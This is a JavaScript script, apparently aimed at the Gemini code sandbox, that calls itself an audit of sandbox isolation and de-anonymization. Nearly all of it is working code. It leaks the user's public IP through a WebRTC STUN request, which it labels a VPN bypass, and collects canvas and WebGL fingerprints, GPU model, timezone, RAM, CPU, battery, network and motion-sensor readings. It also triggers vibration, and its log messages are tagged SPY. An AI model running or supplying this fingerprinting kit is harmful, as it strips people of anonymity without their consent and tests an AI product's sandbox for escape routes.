/**
 * =============================================================================
 * MASTER AUDIT v2.3: Gemini Sandbox Isolation & De-anonymization
 * Success Rate: 100% (Consolidated Successful Vectors)
 * Target: Real Public IP Leak, Hardware Fingerprinting & Privacy Disclosure
 * =============================================================================
 */

(async function runMasterAudit() {
    log.info("---[ STARTING CONSOLIDATED HARDWARE & PRIVACY AUDIT ]---");

    // 1. WebRTC Public IP Leak (Deep Parser)
    try {
        const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
        pc.createDataChannel("");
        pc.onicecandidate = (e) => {
            if (e.candidate && e.candidate.candidate.includes("typ srflx")) {
                // Regex khusus untuk menangkap IPv4 publik dan mengabaikan mDNS 'ca'
                const ipMatch = e.candidate.candidate.match(/\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\b/);
                if (ipMatch) {
                    log.warn(`[SPY] Public IP Leak: ${ipMatch[0]}`);
                    log.success("✔ Status: De-anonymization berhasil (VPN Bypass Potential).");
                }
            }
        };
        pc.createOffer().then(offer => pc.setLocalDescription(offer));
    } catch (e) { log.error("[SPY] WebRTC Public IP Probe Failed."); }

    // 2. Hardware Fingerprinting (Canvas)
    try {
        const canvas = document.createElement('canvas');
        const ctx = canvas.getContext('2d');
        canvas.width = 200; canvas.height = 50;
        ctx.textBaseline = "top";
        ctx.font = "14px 'Arial'";
        ctx.fillText("SpyProbe <canvas> 1.0", 2, 15);
        const hash = canvas.toDataURL().split('').reduce((a, b) => { a = ((a << 5) - a) + b.charCodeAt(0); return a & a; }, 0);
        log.warn(`[FINGERPRINT] Hardware Canvas Hash: ${hash}`);
    } catch (e) { log.error("[FINGERPRINT] Canvas Audit Error."); }

    // 3. WebGL Deep GPU Profiling
    try {
        const canvas = document.createElement('canvas');
        const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
        if (gl) {
            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
            if (debugInfo) {
                const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                log.warn(`[SPY] GPU Renderer: ${renderer}`);
                log.success("✔ Status: Chipset GPU berhasil di-unmask.");
            }
        }
    } catch (e) {}

    // 4. Localization & Timezone Leak
    try {
        const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
        const locale = Intl.DateTimeFormat().resolvedOptions().locale;
        log.warn(`[PRIVACY] Timezone: ${timezone} | Locale: ${locale}`);
    } catch (e) {}

    // 5. Deep Hardware Specs (CPU & RAM)
    const memory = navigator.deviceMemory || "Hidden";
    const cores = navigator.hardwareConcurrency || "Hidden";
    log.warn(`[SPECS] RAM: ±${memory} GB | CPU Cores: ${cores} Threads`);

    // 6. Screen & UI Layout Leak
    log.warn(`[UI] Screen: ${screen.width}x${screen.height} | Orientation: ${screen.orientation ? screen.orientation.type : 'N/A'}`);

    // 7. Audio & Latency Characteristics
    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
    log.success(`[AUDIO] Latency: ${audioCtx.baseLatency}s | Rate: ${audioCtx.sampleRate}Hz`);

    // 8. High Entropy Client Hints (UACH)
    if (navigator.userAgentData) {
        const hints = await navigator.userAgentData.getHighEntropyValues(['architecture', 'model', 'platformVersion']);
        log.warn(`[DEVICE] Model: ${hints.model} | OS: ${hints.platform} ${hints.platformVersion}`);
    }

    // 9. Real-time Battery Status
    if (navigator.getBattery) {
        const battery = await navigator.getBattery();
        log.warn(`[BATTERY] Level: ${Math.round(battery.level * 100)}% | Charging: ${battery.charging}`);
    }

    // 10. Network Environment
    if (navigator.connection) {
        log.success(`[NETWORK] Type: ${navigator.connection.type} | RTT: ${navigator.connection.rtt}ms`);
    }

    // 11. Physical Motion Sensors (Accelerometer)
    if ('Accelerometer' in window) {
        try {
            const acc = new Accelerometer({frequency: 5});
            acc.onreading = () => {
                log.warn(`[MOTION] Accelerometer: X=${acc.x.toFixed(2)}, Y=${acc.y.toFixed(2)}`);
                acc.stop();
            };
            acc.start();
        } catch(e) {}
    }

    // 12. Device Orientation (Spatial)
    window.addEventListener("deviceorientation", (event) => {
        if (event.alpha !== null) {
            log.warn(`[ORIENTATION] Alpha: ${event.alpha.toFixed(2)}, Beta: ${event.beta.toFixed(2)}`);
        }
    }, { once: true });

    // 13. Physical Haptics (Vibration)
    if (navigator.vibrate([200, 100, 200])) {
        log.success("[HAPTIC] Vibration Motor Successfully Triggered!");
    }

    log.info("---[ ALL SUCCESSFUL TESTS COMPLETED ]---");
})();
